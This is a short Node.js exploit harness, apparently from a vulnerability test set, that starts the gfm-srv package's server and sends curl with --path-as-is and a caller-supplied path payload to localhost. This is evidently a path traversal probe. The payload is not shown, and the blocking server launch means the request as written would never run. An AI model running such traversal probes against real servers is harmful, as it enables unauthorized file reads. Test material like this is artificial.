const path = require("path");
const { execSync } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
  // Start the server
  execSync("node ./node_modules/gfm-srv/index.js");

  // Wait for the server to start
  sleep.sleep(2);

  // Send the attack string
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8000${payload}"`;
  const stdout = execSync(attack_string);

  return stdout.toString();
}

module.exports = { exploitFunction };